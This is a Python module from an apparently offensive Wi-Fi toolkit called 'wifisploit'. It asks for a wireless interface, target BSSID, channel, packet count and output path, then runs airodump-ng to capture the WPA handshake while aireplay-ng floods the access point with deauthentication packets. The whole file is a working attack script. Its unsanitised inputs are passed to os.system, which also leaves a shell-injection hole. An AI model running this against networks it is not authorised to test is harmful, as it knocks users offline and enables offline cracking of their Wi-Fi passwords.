# wifisploit/modules/capture_handshake.py

import os
from pystyle import Colorate, Colors
from colorama import init
init(autoreset=True)

gradient_colors = Colors.red_to_white

interface = input(Colorate.Horizontal(gradient_colors, "wsf (Interface) > "))
if interface.lower() == "back":
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"Interface => {interface}"))

bssid = input(Colorate.Horizontal(gradient_colors, "wsf (BSSID) > "))
if bssid.lower() == "back":
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"BSSID => {bssid}"))

channel = input(Colorate.Horizontal(gradient_colors, "wsf (Channel) > "))
if channel.lower() == "back":
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"Channel => {channel}"))

packet = input(Colorate.Horizontal(gradient_colors, "wsf (Packets) > "))
if packet.lower() == "back":
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"Packets => {packet}"))

path = input(Colorate.Horizontal(gradient_colors, "wsf (Path) > "))
if path.lower() == "back":
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"Path => {path}"))

os.system(f"iwconfig {interface} channel {channel}")
os.system(f"xterm -geometry 120x35 -e airodump-ng {interface} --bssid {bssid} -c {channel} -w {path} | xterm -geometry 120x35 -e aireplay-ng --deauth {packet} -a {bssid} {interface}")